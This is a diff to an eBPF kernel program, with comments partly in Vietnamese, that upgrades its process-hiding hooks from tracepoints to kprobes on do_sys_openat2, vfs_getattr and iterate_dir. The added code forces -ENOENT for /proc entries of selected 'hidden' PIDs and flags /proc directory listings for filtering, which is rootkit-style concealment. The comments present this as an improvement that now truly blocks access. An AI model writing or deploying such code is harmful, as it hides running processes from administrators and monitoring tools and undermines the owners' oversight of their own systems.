@@ -53,6 +53,14 @@ struct {
     __type(value, u32);  /* 1 = auto-hide containers, 0 = manual only */
 } auto_container_hide_map SEC(".maps");
 
+/* Map để track /proc directory file handles cho filtering */
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 1024);
+    __type(key, u64);    /* file pointer */
+    __type(value, u32);  /* filter flag */
+} proc_dir_filter_map SEC(".maps");
+
 /* =====================================================
  *  External Maps - Shared with cpu_throttle system
  * ===================================================== */
@@ -331,20 +339,41 @@ int on_tcp_connect(struct pt_regs *ctx)
 
 /* Enhanced syscall-level hooks for effective proc hiding */
 
-/* Hook openat syscall to block /proc/[PID] access */
-SEC("tracepoint/syscalls/sys_enter_openat")
-int hide_openat_syscall(struct trace_event_raw_sys_enter *ctx)
+/* =====================================================
+ *  OPTIMIZED: Kprobe-based openat interception với real blocking
+ * ===================================================== */
+
+/* Enhanced kprobe cho do_sys_openat2 - CÓ THỂ OVERRIDE RETURN */
+SEC("kprobe/do_sys_openat2")
+int enhanced_hide_openat(struct pt_regs *ctx)
 {
     if (!is_obfuscation_enabled())
         return 0;
 
-    /* Get filename from syscall arguments */
-    const char *filename = (const char *)ctx->args[1];
+    /* Get filename parameter từ register (more efficient) */
+    struct filename *filename_struct = (struct filename *)PT_REGS_PARM2(ctx);
+    if (!filename_struct)
+        return 0;
+
+    /* Read filename từ kernel space (faster than user space) */
+    const char *filename = BPF_CORE_READ(filename_struct, name);
     if (!filename)
         return 0;
 
+    /* Fast path check - chỉ xử lý /proc paths */
+    char first_chars[6];
+    if (bpf_probe_read_kernel(first_chars, 5, filename) < 0)
+        return 0;
+
+    /* Quick rejection for non-/proc paths */
+    if (!(first_chars[0] == '/' && first_chars[1] == 'p' &&
+          first_chars[2] == 'r' && first_chars[3] == 'o' &&
+          first_chars[4] == 'c'))
+        return 0;
+
+    /* Full path processing chỉ cho /proc paths */
     char path[256];
-    if (bpf_probe_read_user_str(path, sizeof(path), filename) < 0)
+    if (bpf_probe_read_kernel_str(path, sizeof(path), filename) < 0)
         return 0;
 
     /* Check if this is a /proc/[PID] path */
@@ -353,8 +382,8 @@ int hide_openat_syscall(struct trace_event_raw_sys_enter *ctx)
         if (pid > 0 && is_hidden_pid(pid)) {
             submit_event(8, pid); /* 8 = openat_blocked */
 
-            /* Note: bpf_override_return requires kprobe, not tracepoint */
-            /* For tracepoint, we log and let userspace handle filtering */
+            /* ✅ THỰC SỰ CHẶN bằng override return */
+            bpf_override_return(ctx, -ENOENT);
             return 0;
         }
     }
@@ -413,30 +442,44 @@ int hide_read_syscall(struct trace_event_raw_sys_enter *ctx)
     return 0;
 }
 
-/* Hook stat/lstat syscalls to hide process directories */
-SEC("tracepoint/syscalls/sys_enter_newfstatat")
-int hide_stat_syscall(struct trace_event_raw_sys_enter *ctx)
+/* =====================================================
+ *  OPTIMIZED: Kprobe-based stat với real blocking capability
+ * ===================================================== */
+
+/* Enhanced kprobe cho vfs_getattr - CÓ THỂ OVERRIDE RETURN */
+SEC("kprobe/vfs_getattr")
+int enhanced_hide_stat(struct pt_regs *ctx)
 {
     if (!is_obfuscation_enabled())
         return 0;
 
-    /* Get filename from syscall arguments */
-    const char *filename = (const char *)ctx->args[1];
-    if (!filename)
+    /* Get path parameter từ register */
+    struct path *path_struct = (struct path *)PT_REGS_PARM1(ctx);
+    if (!path_struct)
         return 0;
 
-    char path[256];
-    if (bpf_probe_read_user_str(path, sizeof(path), filename) < 0)
+    /* Extract dentry và get path string */
+    struct dentry *dentry = BPF_CORE_READ(path_struct, dentry);
+    if (!dentry)
         return 0;
 
-    /* Check if this is a /proc/[PID] path */
-    if (is_proc_path(path)) {
-        u32 pid = extract_pid_from_proc_path(path);
+    /* Get filename từ dentry */
+    const unsigned char *name = BPF_CORE_READ(dentry, d_name.name);
+    if (!name)
+        return 0;
+
+    char filename[64];
+    if (bpf_probe_read_kernel_str(filename, sizeof(filename), name) < 0)
+        return 0;
+
+    /* Check if this is a numeric PID directory */
+    if (is_numeric_string(filename)) {
+        u32 pid = string_to_pid(filename);
         if (pid > 0 && is_hidden_pid(pid)) {
             submit_event(11, pid); /* 11 = stat_blocked */
 
-            /* Note: bpf_override_return requires kprobe, not tracepoint */
-            /* For tracepoint, we log and let userspace handle filtering */
+            /* ✅ THỰC SỰ CHẶN stat operation */
+            bpf_override_return(ctx, -ENOENT);
             return 0;
         }
     }
@@ -444,30 +487,45 @@ int hide_stat_syscall(struct trace_event_raw_sys_enter *ctx)
     return 0;
 }
 
-/* Enhanced getdents64 hook with directory path checking */
-SEC("tracepoint/syscalls/sys_enter_getdents64")
-int hide_getdents64_syscall(struct trace_event_raw_sys_enter *ctx)
+/* =====================================================
+ *  OPTIMIZED: Kprobe-based getdents64 với direct directory filtering
+ * ===================================================== */
+
+/* Enhanced kprobe cho iterate_dir - DIRECT CONTROL over directory iteration */
+SEC("kprobe/iterate_dir")
+int enhanced_hide_getdents(struct pt_regs *ctx)
 {
     if (!is_obfuscation_enabled())
         return 0;
 
-    /* Get file descriptor from syscall arguments */
-    int fd = (int)ctx->args[0];
-    if (fd < 0)
+    /* Get file parameter từ register */
+    struct file *file = (struct file *)PT_REGS_PARM1(ctx);
+    if (!file)
         return 0;
 
-    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
-
-    /* Check if this is /proc directory listing */
-    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
-    if (!task)
+    /* Check if this is /proc directory */
+    struct dentry *dentry = BPF_CORE_READ(file, f_path.dentry);
+    if (!dentry)
         return 0;
 
-    /* Log the getdents64 attempt for /proc */
-    submit_event(6, current_pid); /* 6 = getdents64_syscall_intercepted */
+    const unsigned char *dir_name = BPF_CORE_READ(dentry, d_name.name);
+    char dirname[8];
+    if (bpf_probe_read_kernel(dirname, 5, dir_name) < 0)
+        return 0;
 
-    /* Note: Directory entry filtering requires userspace cooperation
-     * or kernel module approach for direct manipulation */
+    /* Fast check for "proc" directory */
+    if (dirname[0] == 'p' && dirname[1] == 'r' &&
+        dirname[2] == 'o' && dirname[3] == 'c' && dirname[4] == '\0') {
+
+        u32 current_pid = bpf_get_current_pid_tgid() >> 32;
+        submit_event(6, current_pid); /* 6 = getdents64_called */
+
+        /* Mark file for userspace post-processing */
+        u64 file_ptr = (u64)file;
+        u32 flag = 1;
+        bpf_map_update_elem(&proc_dir_filter_map, &file_ptr, &flag, BPF_ANY);
+    }
+
     return 0;
 }
 
@@ -663,4 +721,30 @@ int on_process_exec(struct trace_event_raw_sched_process_exec *ctx)
     }
 
     return 0;
+}
+
+/* =====================================================
+ *  Helper Functions cho Enhanced Kprobe Architecture
+ * ===================================================== */
+
+/* Check if string is numeric (for PID detection) */
+static __always_inline bool is_numeric_string(const char *str) {
+    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
+        if (str[i] < '0' || str[i] > '9') {
+            return false;
+        }
+    }
+    return true;
+}
+
+/* Convert string to PID */
+static __always_inline u32 string_to_pid(const char *str) {
+    u32 pid = 0;
+    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
+        if (str[i] < '0' || str[i] > '9') {
+            break;
+        }
+        pid = pid * 10 + (str[i] - '0');
+    }
+    return pid;
 }
